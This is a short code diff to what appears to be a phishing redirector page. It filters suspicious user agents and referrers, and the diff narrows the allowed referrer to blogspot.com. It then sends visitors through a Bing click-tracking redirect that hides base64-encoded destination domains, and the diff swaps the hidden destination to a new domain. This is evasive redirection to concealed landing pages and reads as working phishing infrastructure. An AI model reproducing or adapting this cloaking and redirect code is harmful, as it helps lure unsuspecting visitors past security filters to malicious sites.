@@ -55,7 +55,7 @@ foreach ($suspicious_agents as $agent) {
 $referrer = $_SERVER['HTTP_REFERER'] ?? '';
 if (!empty($referrer)) {
     // Block suspicious referrers (optional: add your own conditions)
-    $allowed_domains = ['https://www.google.com']; // Add valid domains
+    $allowed_domains = ['blogspot.com']; // Add valid domains
     $is_valid_referrer = false;
 
     foreach ($allowed_domains as $domain) {
@@ -358,7 +358,7 @@ if (isset($requests[$ip])) {
                 messageElement.textContent = "You can proceed now";
                 button.classList.add('blue');
                 button.onclick = () => {
-                    window.location.href = `https://www.bing.com/ck/a?!&&p=4ed30224ac809bc0JmltdHM9MTcyMzQyMDgwMCZpZ3VpZD0zNjRmNjVlOC1lNTZjLTYxOWQtMTI1Ny03MTNlZTQyYTYwMTImaW5zaWQ9NTE0MQ&ptn=3&ver=2&hsh=3&fclid=364f65e8-e56c-619d-1257-713ee42a6012&u=a1aHR0cDovL3d3dy40NDQzMTcuY29tLw#aHR0cHM6Ly9GRS5uZGxldmVzaW8uY29tL3ZyYlUv/`;
+                    window.location.href = `https://www.bing.com/ck/a?!&&p=4ed30224ac809bc0JmltdHM9MTcyMzQyMDgwMCZpZ3VpZD0zNjRmNjVlOC1lNTZjLTYxOWQtMTI1Ny03MTNlZTQyYTYwMTImaW5zaWQ9NTE0MQ&ptn=3&ver=2&hsh=3&fclid=364f65e8-e56c-619d-1257-713ee42a6012&u=a1aHR0cDovL3d3dy40NDQzMTcuY29tLw#aHR0cHM6Ly9jbG91ZC5yaGVydGhpdmkuY29tLzNpWGwv/`;
                 };
             }
         }
